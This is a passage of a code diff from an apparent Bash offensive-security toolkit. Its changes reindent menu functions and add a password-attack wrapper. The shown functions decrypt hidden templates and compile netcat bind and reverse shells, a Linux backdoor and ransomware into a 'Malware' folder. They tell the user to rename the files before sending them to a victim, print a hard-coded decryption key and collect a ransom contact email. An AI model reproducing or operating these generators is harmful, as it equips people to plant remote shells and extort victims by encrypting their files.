-        echo -e "$r \nFile $FILE not found. Exiting. $x"
-        exit 1
-    fi
-    # Use fzf to allow the user to search within the selected file
-    echo -e "$p \nSearching within $x $CATEGORY $p dorks... $x"
-    SELECTED_DORK=$(fzf --prompt="Search $CATEGORY dorks (or press Esc to go back): " < "$FILE")
-    # If the user presses Esc or selects nothing, loop back to the category selection
-    if [[ -z $SELECTED_DORK ]]; then
-        echo -e "$r \nNo dork selected, returning to category selection... $x"
-        continue
-    fi
-    # Display the selected dork
-    echo -e "$g \nSelected dork: $x $SELECTED_DORK"
-    break
-done
-wait_and_return
+        fi
+        # Display the selected dork
+        echo -e "$g \nSelected dork: $x $SELECTED_DORK"
+        break
+    done
+    wait_and_return
 }
 
 # Class:OSINT - Tool: holehe email finder Program 7
 email_search() {
-clear
-osint_socialemail_frame
-sleep 3
-echo -e "$g \nEnter email address to search the web for. \n $x"
-read -r -p "${c} ${A} ${x}" email
-echo -e "$y \nWould you like in CSV format? Y/N \n $x"
-read -r -n 1 -p "${c} ${A} ${x}" cho
-if [[ "$cho" =~ [Yy] ]]; then
-	holeho --only-used --csv "$email"
-	wait_and_return
-elif [[ "$cho" =~ [Nn] ]]; then
-	holehe --only-used "$email"
-	wait_and_return
-else
-	echo -e "$r \nBad option $x"
-fi
+    A="$ao Email Search ==> ${x}"
+    clear
+    osint_socialemail_frame
+    sleep 3
+    echo -e "$g \nEnter email address to search the web for. \n $x"
+    read -r -p "${c} ${A} ${x}" email
+    echo -e "$y \nWould you like in CSV format? Y/N \n $x"
+    read -r -n 1 -p "${c} ${A} ${x}" cho
+    if [[ "$cho" =~ [Yy] ]]; then
+    	holeho --only-used --csv "$email"
+    	wait_and_return
+    elif [[ "$cho" =~ [Nn] ]]; then
+    	holehe --only-used "$email"
+    	wait_and_return
+    else
+    	echo -e "$r \nBad option $x"
+    fi
+}
+
+# Class:OSINT - Tool: password attack Program 8 (Wrapper Used)
+pass_attack() {
+    A="$ao Password Attack ==> ${x}"
+    clear
+    osint_passattack_frame
+    sleep 3
+    export CSTK_MAIN_RUNNER=1
+    "$cstk_wrapper" "$pass_attack"
+    wait_and_return
 }
 
 ########### PAYLOADS FUNCTIONS #######################
 
 # First tools are netcat binding and reverse shells separated earlier but joined  now with a option function
 netcat_choice() {
-clear
-payloads_nc_frame
-echo -e "$p \nDo you want to create a:$r \n1$c - binding netcat shell script$r \n2$c - reverse netcat shell script $r \n3 - Exit $b \nEnter option 1, 2, or 3 to exit $x \n"
-read -r -n 1 -p "${c} ${A} ${x}" opt
-until [[ "$opt" =~ [1|2|3] ]]; do
-	echo -e "$r \nBad option pick 1,2, or 3 \n $x"
-	read -r -n 1 -p "${c} ${A} ${x}" opt
-done
-if [[ "$opt" -eq 1 ]]; then
-	netcat_shells_bind
-elif [[ "$opt" -eq 2 ]]; then
-    netcat_shells_reverse
-else
-	wait_and_return
-fi
+    A="$ap Netcat ==> ${x}"
+    clear
+    payloads_nc_frame
+    echo -e "$p \nDo you want to create a:$r \n1$c - binding netcat shell script$r \n2$c - reverse netcat shell script $r \n3 - Exit $b \nEnter option 1, 2, or 3 to exit $x \n"
+    read -r -n 1 -p "${c} ${A} ${x}" opt
+    until [[ "$opt" =~ [1|2|3] ]]; do
+    	echo -e "$r \nBad option pick 1,2, or 3 \n $x"
+    	read -r -n 1 -p "${c} ${A} ${x}" opt
+    done
+    if [[ "$opt" -eq 1 ]]; then
+    	netcat_shells_bind
+    elif [[ "$opt" -eq 2 ]]; then
+        netcat_shells_reverse
+    else
+    	wait_and_return
+    fi
 }
 
 # Class: PAYLOADS - Tool: Netcat Bind Shell Payload - Option 1-A
 netcat_shells_bind() {
-file="$NetcatBindShell"
-trap 'rm -f $file $ncbo ' SIGQUIT SIGILL SIGTERM SIGHUP
-clear
-getip
-payloads_nc_frame
-openssl enc -d -aes-256-cbc -salt -pbkdf2 -in "$ncb" -out "$ncbo" -pass pass:"$pswd"
-base32hex -d "$ncbo" | base64 -d | base32plain -d > "$NetcatBindShell"
-template=$(cat "$NetcatBindShell")
-final_script=$(echo "$template" | awk -v ip="$chosen_ip" -v port="$chosen_port" '{ gsub(/IP/, ip) ; gsub(/PORT/, port) ; print }')
-echo "$final_script" > netcatbindshell.temp1 # create full correct script
-#    bash-obfuscate -c 2 -r netcatbindshell.temp1 -o netcatbindshell.temp2 # obfuscate script does not use bin/bash when encrypting
-#	echo '#!/bin/bash' > netcatbindshell.temp3 # create new file with bin bash as first line
-#    cat netcatbindshell.temp2 >> netcatbindshell.temp3 # append the encrypted script to file
-chmod 770 netcatbindshell.temp1
-shc -r -f netcatbindshell.temp1 -o "$Malware"/NetcatBindingShellScript # compile script
-rm -f netcatbindshell.* "$NetcatBindShell" "$ncbo" # remove junk files
-echo -e "$c File \"NetcatBindingShellScript\" is ready and executable in the $Malware folder. \n Change the name of file before sending to target. $x"
-echo -e "Date and Time: $DATE \nUser's Name: $USER \nUser Port $chosen_port \nScript Ran: netcat binding shell create" >> "$log/NetcatBindShell.log" # log the information for user later if needed
-if [[ "$comeback" = 1 ]]; then
-    return
-else
-    wait_and_return
-fi
+    file="$NetcatBindShell"
+    trap 'rm -f $file $ncbo ' SIGQUIT SIGILL SIGTERM SIGHUP
+    clear
+    getip
+    payloads_nc_frame
+    openssl enc -d -aes-256-cbc -salt -pbkdf2 -in "$ncb" -out "$ncbo" -pass pass:"$pswd"
+    base32hex -d "$ncbo" | base64 -d | base32plain -d > "$NetcatBindShell"
+    template=$(cat "$NetcatBindShell")
+    final_script=$(echo "$template" | awk -v ip="$chosen_ip" -v port="$chosen_port" '{ gsub(/IP/, ip) ; gsub(/PORT/, port) ; print }')
+    echo "$final_script" > netcatbindshell.temp1 # create full correct script
+    #    bash-obfuscate -c 2 -r netcatbindshell.temp1 -o netcatbindshell.temp2 # obfuscate script does not use bin/bash when encrypting
+    #	echo '#!/bin/bash' > netcatbindshell.temp3 # create new file with bin bash as first line
+    #    cat netcatbindshell.temp2 >> netcatbindshell.temp3 # append the encrypted script to file
+    chmod 770 netcatbindshell.temp1
+    shc -r -f netcatbindshell.temp1 -o "$Malware"/NetcatBindingShellScript # compile script
+    rm -f netcatbindshell.* "$NetcatBindShell" "$ncbo" # remove junk files
+    echo -e "$c File \"NetcatBindingShellScript\" is ready and executable in the $Malware folder. \n Change the name of file before sending to target. $x"
+    echo -e "Date and Time: $DATE \nUser's Name: $USER \nUser Port $chosen_port \nScript Ran: netcat binding shell create" >> "$log/NetcatBindShell.log" # log the information for user later if needed
+    if [[ "$comeback" = 1 ]]; then
+        return
+    else
+        wait_and_return
+    fi
 }
 
 # Class: PAYLOADS - Tool: Netcat Reverse Shell - Option 1-B
 netcat_shells_reverse() {
-file="$NetcatRevShell"
-trap 'rm -f $file $ncro' SIGQUIT SIGILL SIGTERM SIGHUP
-clear
-getip
-payloads_nc_frame
-openssl enc -d -aes-256-cbc -salt -pbkdf2 -in "$ncr" -out "$ncro" -pass pass:"$pswd"
-base32hex -d "$ncro" | base64 -d | base32plain -d > "$NetcatRevShell"
-template=$(cat "$NetcatRevShell")
-final_script=$(echo "$template" | awk -v ip="$chosen_ip" -v port="$chosen_port" '{ gsub(/IP/, ip) ; gsub(/PORT/, port) ; print }')
-echo "$final_script" > netcatreverseshell.temp1 # create full correct script
-#    bash-obfuscate -c 2 -r netcatreverseshell.temp1 -o netcatreverseshell.temp2 # obfuscate script does not use bin/bash when encrypting
-#    echo '#!/bin/bash'  > netcatreverseshell.temp3 # create new file with bin bash as first line
-#    cat netcatreverseshell.temp2 >> netcatreverseshell.temp3 # append the encrypted script to file
-chmod 770 netcatreverseshell.temp1
-shc -r -f netcatreverseshell.temp1 -o "$Malware"/NetcatReverseShellScript # compile script
-rm -f netcatreverseshell.* "$ncro" "$NetcatRevShell" # remove junk files
-echo -e "$c File \"NetcatReverseShellScript\" is ready and executable in the $Malware folder. \nChange the name of file before sending to target. $x"
-echo -e "Date and Time: $DATE \nUser's Name: $USER \nUser IP used: $chosen_ip \nUser Port $chosen_port \nNetcat Reverse shell create" >> "$log/NetcatReverseShell.log"
-if [[ "$comeback" = 1 ]]; then
-    return
-else
-    wait_and_return
-fi
+    file="$NetcatRevShell"
+    trap 'rm -f $file $ncro' SIGQUIT SIGILL SIGTERM SIGHUP
+    clear
+    getip
+    payloads_nc_frame
+    openssl enc -d -aes-256-cbc -salt -pbkdf2 -in "$ncr" -out "$ncro" -pass pass:"$pswd"
+    base32hex -d "$ncro" | base64 -d | base32plain -d > "$NetcatRevShell"
+    template=$(cat "$NetcatRevShell")
+    final_script=$(echo "$template" | awk -v ip="$chosen_ip" -v port="$chosen_port" '{ gsub(/IP/, ip) ; gsub(/PORT/, port) ; print }')
+    echo "$final_script" > netcatreverseshell.temp1 # create full correct script
+    #    bash-obfuscate -c 2 -r netcatreverseshell.temp1 -o netcatreverseshell.temp2 # obfuscate script does not use bin/bash when encrypting
+    #    echo '#!/bin/bash'  > netcatreverseshell.temp3 # create new file with bin bash as first line
+    #    cat netcatreverseshell.temp2 >> netcatreverseshell.temp3 # append the encrypted script to file
+    chmod 770 netcatreverseshell.temp1
+    shc -r -f netcatreverseshell.temp1 -o "$Malware"/NetcatReverseShellScript # compile script
+    rm -f netcatreverseshell.* "$ncro" "$NetcatRevShell" # remove junk files
+    echo -e "$c File \"NetcatReverseShellScript\" is ready and executable in the $Malware folder. \nChange the name of file before sending to target. $x"
+    echo -e "Date and Time: $DATE \nUser's Name: $USER \nUser IP used: $chosen_ip \nUser Port $chosen_port \nNetcat Reverse shell create" >> "$log/NetcatReverseShell.log"
+    if [[ "$comeback" = 1 ]]; then
+        return
+    else
+        wait_and_return
+    fi
 
 }
 
 # Class: PAYLOADS - Tools: Linux Back door Creator - Option 2
 rev_shells() {
-file="$LinuxRevShell"
-trap 'rm -f $file' SIGQUIT SIGILL SIGTERM SIGHUP
-clear
-getip
-payloads_linuxshells_frame
-openssl enc -d -aes-256-cbc -salt -pbkdf2 -in "$rvs" -out "$rvso" -pass pass:"$pswd"
-base32hex -d "$rvso" | base64 -d | base32plain -d > "$LinuxRevShell"
-template=$(cat "$LinuxRevShell")
-final_script=$(echo "$template" | awk -v ip="$chosen_ip" -v port="$chosen_port" '{ gsub(/IP/, ip) ; gsub(/PORT/, port) ; print }')
-echo  "$final_script" > revshell.temp1
-rm -f "$rvso" "$LinuxRevShell"
-#	bash-obfuscate -c 2 revshell.temp1 -o revshell.temp2
-#	wait
-#	echo '#!/bin/bash' > revshell.temp3
-#	cat revshell.temp2 >> revshell.temp3
-chmod 770 revshell.temp1
-shc -r -f revshell.temp1 -o "$Malware"/RevShell
-rm -f revshell.*
-echo -e "$c File \"RevShell\" is ready and executable in the $Malware folder. \n Change the name of file before sending to victim. $x"
-echo -e "\n\nToday's Date and Time: $DATE \nUser's Name: $USER \nIP and Port used: $chosen_ip:$chosen_port \nProgram Name: Reverse shell gen" >> "$log/ReverseShells.log"
-wait_and_return
+    file="$LinuxRevShell"
+    trap 'rm -f $file' SIGQUIT SIGILL SIGTERM SIGHUP
+    clear
+    getip
+    payloads_linuxshells_frame
+    openssl enc -d -aes-256-cbc -salt -pbkdf2 -in "$rvs" -out "$rvso" -pass pass:"$pswd"
+    base32hex -d "$rvso" | base64 -d | base32plain -d > "$LinuxRevShell"
+    template=$(cat "$LinuxRevShell")
+    final_script=$(echo "$template" | awk -v ip="$chosen_ip" -v port="$chosen_port" '{ gsub(/IP/, ip) ; gsub(/PORT/, port) ; print }')
+    echo  "$final_script" > revshell.temp1
+    rm -f "$rvso" "$LinuxRevShell"
+    #	bash-obfuscate -c 2 revshell.temp1 -o revshell.temp2
+    #	wait
+    #	echo '#!/bin/bash' > revshell.temp3
+    #	cat revshell.temp2 >> revshell.temp3
+    chmod 770 revshell.temp1
+    shc -r -f revshell.temp1 -o "$Malware"/RevShell
+    rm -f revshell.*
+    echo -e "$c File \"RevShell\" is ready and executable in the $Malware folder. \n Change the name of file before sending to victim. $x"
+    echo -e "\n\nToday's Date and Time: $DATE \nUser's Name: $USER \nIP and Port used: $chosen_ip:$chosen_port \nProgram Name: Reverse shell gen" >> "$log/ReverseShells.log"
+    wait_and_return
 }
 
 ransomware_shell_options() {
-clear && payloads_ransomware_frame
-echo -e "${p} Choose option:${g} \n 1 - A script to encrypt the home directory and all sub directories, Windows or Linux wrote in golang ${c} \n 2 - A script to encrypt linux file system root,home,mnt,media,opt and all sub directories. ${x}"
-read -r -n 1 -p "${r} Enter number 1 or 2 ${c} ${A} ${x}" opt
-if [[ "$opt" = 1 ]]; then
-    ransomware_in_go
-elif [[ "$opt" = 2 ]]; then
-    ransomware_quick_dirty
-else
-    echo -e "${r} Bad option ${x}"
-    exit 3
-fi
+    A="$ap Ransomware ==> ${x}"
+    clear && payloads_ransomware_frame
+    echo -e "${p} Choose option:${g} \n 1 - A script to encrypt the home directory and all sub directories, Windows or Linux wrote in golang ${c} \n 2 - A script to encrypt linux file system root,home,mnt,media,opt and all sub directories. ${x}"
+    read -r -n 1 -p "${r} Enter number 1 or 2 ${c} ${A} ${x}" opt
+    if [[ "$opt" = 1 ]]; then
+        ransomware_in_go
+    elif [[ "$opt" = 2 ]]; then
+        ransomware_quick_dirty
+    else
+        echo -e "${r} Bad option ${x}"
+        exit 3
+    fi
 }
 
 ransomware_in_go() {
-file="$RansomEncryptGo"
-trap 'rm -f $file' SIGQUIT SIGILL SIGTERM SIGHUP
-clear
-payloads_ransomware_frame
-sleep 3
-echo -e "${g} \ngolang has the ability to encrypt files for  many types of computers and architectures. ${p} \nWould you like to create a script for ${r} \n1 - Linux\n2 - Windows\n3 - MacOS\n4 - FreeBSD\n5 - WebAssembly. ${x}"
-read -r -n 1 -p "${g} Enter a numer 1-5  ${A} ${x}" sys
-if [[ "$sys" = 1 ]]; then
-    system="linux"
-    echo -e "${c} \nEnter number for architecture type options are: ${b}\n1 - amd64\n2 - 386\n3 - arm\n4 - arm64 ${x}"
-    read -r -n 1 -p "${r} Enter number between 1-4  ${A} ${x}" opt
-    case $opt in
-        1) arch="amd64" ;;
-        2) arch=386 ;;
-        3) arch="arm" ;;
-        4) arch="arm64" ;;
-        *) echo -e "${r} Bad option ${x}" && exit ;;
-    esac
-elif [[ "$sys" = 2 ]]; then
-    system="windows"
-    echo -e "${g} \nEnter number for architecture type options are: ${b}\n1 - amd64\n2 - 386 ${x}"
-    read -r -n 1 -p "${r} Enter number 1 or 2  ${A} ${x}" opt
-    case $opt in
-        1) arch="amd64" ;;
-        2) arch=386 ;;
-        *) echo -e "${r} Bad option ${x}" && exit ;;
-    esac
-elif [[ "$sys" = 3 ]]; then
-    system="darwin"
-    echo -e "${g} \nEnter number for architecture type options are: ${b} \n1 - amd64\n2 - arm64 ${x}"
-    read -r -n 1 -p "${r} Enter number 1 or 2  ${A} ${x}" opt
-    case $opt in
-        1) arch="amd64" ;;
-        2) arch="arm64" ;;
-        *) echo -e "${r} Bad option ${x}" && exit ;;
-    esac
-elif [[ "$sys" = 4 ]]; then
-    system="freebsd"
-    echo -e "${g} \nEnter number for architecture type options are: ${b} \n1 - amd64\n2 - 386 ${x}"
-    read -r -n 1 -p "${r} Enter number 1 or 2  ${A} ${x}" opt
-    case $opt in
-        1) arch="amd64" ;;
-        2) arch=386 ;;
-        *) echo -e "${r} Bad option ${x}" && exit ;;
-    esac
-elif [[ "$sys" = 5 ]]; then
-    system="js"
-    arch="wasm"
-else
-    ransomware_in_go
-fi
-echo -e "${p} \nEnter a file name for the finished ${r} encryption ${p} script. ${x}"
-read -r -p "${c} ${A} ${x}" encfilename
-until [[ "$encfilename" != "" ]]; do
+    A="$ap Ransomware ==> ${x}"
+    file="$RansomEncryptGo"
+    trap 'rm -f $file' SIGQUIT SIGILL SIGTERM SIGHUP
+    clear
+    payloads_ransomware_frame
+    sleep 3
+    echo -e "${g} \ngolang has the ability to encrypt files for  many types of computers and architectures. ${p} \nWould you like to create a script for ${r} \n1 - Linux\n2 - Windows\n3 - MacOS\n4 - FreeBSD\n5 - WebAssembly. ${x}"
+    read -r -n 1 -p "${g} Enter a numer 1-5  ${A} ${x}" sys
+    if [[ "$sys" = 1 ]]; then
+        system="linux"
+        echo -e "${c} \nEnter number for architecture type options are: ${b}\n1 - amd64\n2 - 386\n3 - arm\n4 - arm64 ${x}"
+        read -r -n 1 -p "${r} Enter number between 1-4  ${A} ${x}" opt
+        case $opt in
+            1) arch="amd64" ;;
+            2) arch=386 ;;
+            3) arch="arm" ;;
+            4) arch="arm64" ;;
+            *) echo -e "${r} Bad option ${x}" && exit ;;
+        esac
+    elif [[ "$sys" = 2 ]]; then
+        system="windows"
+        echo -e "${g} \nEnter number for architecture type options are: ${b}\n1 - amd64\n2 - 386 ${x}"
+        read -r -n 1 -p "${r} Enter number 1 or 2  ${A} ${x}" opt
+        case $opt in
+            1) arch="amd64" ;;
+            2) arch=386 ;;
+            *) echo -e "${r} Bad option ${x}" && exit ;;
+        esac
+    elif [[ "$sys" = 3 ]]; then
+        system="darwin"
+        echo -e "${g} \nEnter number for architecture type options are: ${b} \n1 - amd64\n2 - arm64 ${x}"
+        read -r -n 1 -p "${r} Enter number 1 or 2  ${A} ${x}" opt
+        case $opt in
+            1) arch="amd64" ;;
+            2) arch="arm64" ;;
+            *) echo -e "${r} Bad option ${x}" && exit ;;
+        esac
+    elif [[ "$sys" = 4 ]]; then
+        system="freebsd"
+        echo -e "${g} \nEnter number for architecture type options are: ${b} \n1 - amd64\n2 - 386 ${x}"
+        read -r -n 1 -p "${r} Enter number 1 or 2  ${A} ${x}" opt
+        case $opt in
+            1) arch="amd64" ;;
+            2) arch=386 ;;
+            *) echo -e "${r} Bad option ${x}" && exit ;;
+        esac
+    elif [[ "$sys" = 5 ]]; then
+        system="js"
+        arch="wasm"
+    else
+        ransomware_in_go
+    fi
     echo -e "${p} \nEnter a file name for the finished ${r} encryption ${p} script. ${x}"
     read -r -p "${c} ${A} ${x}" encfilename
-done
-echo -e "${p} \nEnter a file name for the finished ${r} decryption ${p} script. ${x}"
-read -r -p "${c} ${A} ${x}" decfilename
-until [[ "$decfilename" != "" ]]; do
+    until [[ "$encfilename" != "" ]]; do
+        echo -e "${p} \nEnter a file name for the finished ${r} encryption ${p} script. ${x}"
+        read -r -p "${c} ${A} ${x}" encfilename
+    done
     echo -e "${p} \nEnter a file name for the finished ${r} decryption ${p} script. ${x}"
     read -r -p "${c} ${A} ${x}" decfilename
-done
-openssl enc -d -aes-256-cbc -salt -pbkdf2 -in "$rwg" -out "$rwgo" -pass pass:"$pswd" &>/dev/null
-openssl enc -d -aes-256-cbc -salt -pbkdf2 -in "$rdg" -out "$rdgo" -pass pass:"$pswd" &>/dev/null
-base32hex -d "$rwgo" | base64 -d | base32plain -d > "$RansomEncryptGo"
-base32hex -d "$rdgo" | base64 -d | base32plain -d > "$RansomDecryptGo"
-pushd "$lib" &>/dev/null || return
-env GOOS="$system" GOARCH="$arch" go build "$RansomEncryptGo"
-env GOOS="$system" GOARCH="$arch" go build "$RansomDecryptGo"
-rm -f "$rwgo" "$rdgo" "$RansomEncryptGo" "$RansomDecryptGo"
-if [[ "$system" = "windows" ]]; then
-    mv "$RansomwareEGoW" "$Malware/$encfilename.exe"
-    mv "$RansomwareDGoW" "$Malware/$decfilename.exe"
-else
-    mv "$RansomwareEGo" "$Malware/$encfilename"
-    mv "$RansomwareDGo" "$Malware/$decfilename"
-fi
-popd &>/dev/null || return
-echo "K5R0z4Js58vpNzSq4nixjQt2av8FcIvb" > "$Malware/$decfilename.key"
-echo -e "${g} \nThe encrypt and decrypt scripts are available in the ${r} $Malware ${g} folder if they are for a windows computer there will be a ${y} .exe extension ${x}"
-echo -e "${b} \nTo run the encryption script the target needs to run this command in there terminal: ${r} go run $encfilename ${x} (Linux,MacOS,FreeBSD,WebAssembly) - ${r} go run $encfilename.exe ${x} (Windows)"
-echo -e "${b} \nTo run the decryption script the target needs to run this command in there terminal: ${r} go run $decfilename ${x} (Linux,MacOS,FreeBSD,WebAssembly) - ${r} go run $decfilename.exe ${x} (Windows)"
-echo -e "${c} \nWhen target tries to decrypt there files they will be asked for a ${r} secret key ${c} the key they need is: $A  ${r} K5R0z4Js58vpNzSq4nixjQt2av8FcIvb ${c} <== ${x}"
-echo -e "${y} \nBecause they need a secret key to decrypt there files you are fine to send both files at the same time, the key ${r} is not readable. ${x}"
-echo -e "${g} \nA copy of the key is also in the ${r} $Malware ${g} folder named ${r} $decfilename.key ${x}"
-if [[ "$comeback" = 1 ]]; then
-    return
-else
-    wait_and_return
-fi
+    until [[ "$decfilename" != "" ]]; do
+        echo -e "${p} \nEnter a file name for the finished ${r} decryption ${p} script. ${x}"
+        read -r -p "${c} ${A} ${x}" decfilename
+    done
+    openssl enc -d -aes-256-cbc -salt -pbkdf2 -in "$rwg" -out "$rwgo" -pass pass:"$pswd" &>/dev/null
+    openssl enc -d -aes-256-cbc -salt -pbkdf2 -in "$rdg" -out "$rdgo" -pass pass:"$pswd" &>/dev/null
+    base32hex -d "$rwgo" | base64 -d | base32plain -d > "$RansomEncryptGo"
+    base32hex -d "$rdgo" | base64 -d | base32plain -d > "$RansomDecryptGo"
+    pushd "$lib" &>/dev/null || return
+    env GOOS="$system" GOARCH="$arch" go build "$RansomEncryptGo"
+    env GOOS="$system" GOARCH="$arch" go build "$RansomDecryptGo"
+    rm -f "$rwgo" "$rdgo" "$RansomEncryptGo" "$RansomDecryptGo"
+    if [[ "$system" = "windows" ]]; then
+        mv "$RansomwareEGoW" "$Malware/$encfilename.exe"
+        mv "$RansomwareDGoW" "$Malware/$decfilename.exe"
+    else
+        mv "$RansomwareEGo" "$Malware/$encfilename"
+        mv "$RansomwareDGo" "$Malware/$decfilename"
+    fi
+    popd &>/dev/null || return
+    echo "K5R0z4Js58vpNzSq4nixjQt2av8FcIvb" > "$Malware/$decfilename.key"
+    echo -e "${g} \nThe encrypt and decrypt scripts are available in the ${r} $Malware ${g} folder if they are for a windows computer there will be a ${y} .exe extension ${x}"
+    echo -e "${b} \nTo run the encryption script the target needs to run this command in there terminal: ${r} go run $encfilename ${x} (Linux,MacOS,FreeBSD,WebAssembly) - ${r} go run $encfilename.exe ${x} (Windows)"
+    echo -e "${b} \nTo run the decryption script the target needs to run this command in there terminal: ${r} go run $decfilename ${x} (Linux,MacOS,FreeBSD,WebAssembly) - ${r} go run $decfilename.exe ${x} (Windows)"
+    echo -e "${c} \nWhen target tries to decrypt there files they will be asked for a ${r} secret key ${c} the key they need is: $A  ${r} K5R0z4Js58vpNzSq4nixjQt2av8FcIvb ${c} <== ${x}"
+    echo -e "${y} \nBecause they need a secret key to decrypt there files you are fine to send both files at the same time, the key ${r} is not readable. ${x}"
+    echo -e "${g} \nA copy of the key is also in the ${r} $Malware ${g} folder named ${r} $decfilename.key ${x}"
+    if [[ "$comeback" = 1 ]]; then
+        return
+    else
+        wait_and_return
+    fi
 }
 
 # Class: PAYLOADS - Tool: Ransomware encrypt/decrypt script - Option 3
 ransomware_quick_dirty() {
-file="$RansomEncrypt"
-trap 'rm -f $file' SIGQUIT SIGILL SIGTERM SIGHUP
-clear
-payloads_ransomware_frame
-echo -e "\n\n $g Enter a password for encrypting of the self generating key. $x \n"
-read -r -s -p "${b} ${A} ${x}" PASSWORD1 # get users password silently
-echo -e "Enter Password again \n\n"
-read -r -s -p "${b} ${A} ${x}" PASSWORD2 # confirm correct password match
-while [[ "$PASSWORD1" != "$PASSWORD2" ]]; do
-	echo -e "\nPasswords do not match \nEnter Password: \n" # repeat if needed
-	read -r -s -p "${b} ${A} ${x}" PASSWORD1
-	echo -e "\n Enter Password again \n"
-	read -r -s -p "${b} ${A} ${x}" PASSWORD2
-done
-echo -e "\n\n $g Enter a email address for victim to respond for decryption key. $x \n"
-read -r -p "${c} ${A} ${x}" EMAIL # get a email for user
-openssl enc -d -aes-256-cbc -salt -pbkdf2 -in "$rwe" -out "$rweo" -pass pass:"$pswd"
-openssl enc -d -aes-256-cbc -salt -pbkdf2 -in "$rwd" -out "$rwdo" -pass pass:"$pswd"
-base32hex -d "$rweo" | base64 -d | base32plain -d > "$RansomEncrypt"
-base32hex -d "$rwdo" | base64 -d | base32plain -d > "$RansomDecrypt"
-template=$(cat "$RansomEncrypt")
-template_d=$(cat "$RansomDecrypt")
-final_script=$(echo "$template" | awk -v email="$EMAIL" -v password1="$PASSWORD1" '{ gsub(/EMAIL/, email) ; gsub(/PASSWORD/, password1) ; print }')
-final_script_d=$(echo "$template_d" | awk -v password1="$PASSWORD1" '{ gsub(/PASSWORD1/, password1) ; print }')
-echo "$final_script" > ransom_encrypt_remote.temp1 # create a file for ransomware and decription below
-echo "$final_script_d" > ransom_decrypt_remote.temp1
-rm -f "$rweo" "$RansomEncrypt" "$rwdo" "$RansomDecrypt"
-#	bash-obfuscate -c 2 -r ransom_encrypt_remote.temp1 -o ransom_encrypt_remote.temp2 # encrypt the script's
-#	wait
-#	bash-obfuscate -c 2 -r ransom_decrypt_remote.temp1 -o ransom_decrypt_remote.temp2
-#	wait
-#	echo '#!/bin/bash' > ransom_encrypt_remote.temp3 # get a encrypted file ready for shc - shc needs /bin/bash as 1st line
-#   echo '#!/bin/bash' > ransom_decrypt_remote.temp3
-#	cat ransom_encrypt_remote.temp2 >> ransom_encrypt_remote.temp3 # add content of encrypted script and decryption script below
-#	cat ransom_decrypt_remote.temp2 >> ransom_decrypt_remote.temp3
-chmod 770 ransom_encrypt_remote.temp1 ransom_decrypt_remote.temp1
-shc -r -f ransom_encrypt_remote.temp1 -o "$Malware"/ransom_quick_and_dirty # compile both scripts
-shc -r -f ransom_decrypt_remote.temp1 -o "$Malware"/ransom_nice_and_clean
-rm -rf ransom_encrypt_remote.* ransom_decrypt_remote.*
-echo -e "\n\n $c File ransom_quick_and_dirty and ransom_nice_and_clean are ready and executable in the $Malware folder. \nransom_quick-dirty.sh is the encrypting script. \nransomnice_clean is the decrypting script. $x"
-echo -e "\n\nDate: $DATE \nUser: $USER \nPassword used for key encryption: $PASSWORD1 \nEmail used for victim respond back: $EMAIL" >> "$log/ransom_quick_dirty.log" "$log/ransom_nice_clean.log"
-if [[ "$comeback" = 1 ]]; then
-    return
-else
-    wait_and_return
-fi
+    A="$ap Ransomware ==> ${x}"
+    file="$RansomEncrypt"
+    trap 'rm -f $file' SIGQUIT SIGILL SIGTERM SIGHUP
+    clear
+    payloads_ransomware_frame
+    echo -e "\n\n $g Enter a password for encrypting of the self generating key. $x \n"
+    read -r -s -p "${b} ${A} ${x}" PASSWORD1 # get users password silently
+    echo -e "Enter Password again \n\n"
+    read -r -s -p "${b} ${A} ${x}" PASSWORD2 # confirm correct password match
+    while [[ "$PASSWORD1" != "$PASSWORD2" ]]; do
+    	echo -e "\nPasswords do not match \nEnter Password: \n" # repeat if needed
+    	read -r -s -p "${b} ${A} ${x}" PASSWORD1
+    	echo -e "\n Enter Password again \n"
+    	read -r -s -p "${b} ${A} ${x}" PASSWORD2
+    done
+    echo -e "\n\n $g Enter a email address for victim to respond for decryption key. $x \n"
+    read -r -p "${c} ${A} ${x}" EMAIL # get a email for user
+    openssl enc -d -aes-256-cbc -salt -pbkdf2 -in "$rwe" -out "$rweo" -pass pass:"$pswd"
+    openssl enc -d -aes-256-cbc -salt -pbkdf2 -in "$rwd" -out "$rwdo" -pass pass:"$pswd"
+    base32hex -d "$rweo" | base64 -d | base32plain -d > "$RansomEncrypt"
+    base32hex -d "$rwdo" | base64 -d | base32plain -d > "$RansomDecrypt"
+    template=$(cat "$RansomEncrypt")
+    template_d=$(cat "$RansomDecrypt")
+    final_script=$(echo "$template" | awk -v email="$EMAIL" -v password1="$PASSWORD1" '{ gsub(/EMAIL/, email) ; gsub(/PASSWORD/, password1) ; print }')
+    final_script_d=$(echo "$template_d" | awk -v password1="$PASSWORD1" '{ gsub(/PASSWORD1/, password1) ; print }')
+    echo "$final_script" > ransom_encrypt_remote.temp1 # create a file for ransomware and decription below
+    echo "$final_script_d" > ransom_decrypt_remote.temp1
+    rm -f "$rweo" "$RansomEncrypt" "$rwdo" "$RansomDecrypt"
+    #	bash-obfuscate -c 2 -r ransom_encrypt_remote.temp1 -o ransom_encrypt_remote.temp2 # encrypt the script's
+    #	wait
+    #	bash-obfuscate -c 2 -r ransom_decrypt_remote.temp1 -o ransom_decrypt_remote.temp2
+    #	wait
+    #	echo '#!/bin/bash' > ransom_encrypt_remote.temp3 # get a encrypted file ready for shc - shc needs /bin/bash as 1st line
+    #   echo '#!/bin/bash' > ransom_decrypt_remote.temp3
+    #	cat ransom_encrypt_remote.temp2 >> ransom_encrypt_remote.temp3 # add content of encrypted script and decryption script below
+    #	cat ransom_decrypt_remote.temp2 >> ransom_decrypt_remote.temp3
+    chmod 770 ransom_encrypt_remote.temp1 ransom_decrypt_remote.temp1
+    shc -r -f ransom_encrypt_remote.temp1 -o "$Malware"/ransom_quick_and_dirty # compile both scripts
+    shc -r -f ransom_decrypt_remote.temp1 -o "$Malware"/ransom_nice_and_clean
+    rm -rf ransom_encrypt_remote.* ransom_decrypt_remote.*
+    echo -e "\n\n $c File ransom_quick_and_dirty and ransom_nice_and_clean are ready and executable in the $Malware folder. \nransom_quick-dirty.sh is the encrypting script. \nransomnice_clean is the decrypting script. $x"
+    echo -e "\n\nDate: $DATE \nUser: $USER \nPassword used for key encryption: $PASSWORD1 \nEmail used for victim respond back: $EMAIL" >> "$log/ransom_quick_dirty.log" "$log/ransom_nice_clean.log"
+    if [[ "$comeback" = 1 ]]; then
+        return
+    else
+        wait_and_return
+    fi
 }
 
 # Class:PAYLOADS - Tool:Multi reverse shell option script - Option 4 (wrapper used)
 rev_shells_all() {
-file="$make_shells_bin"
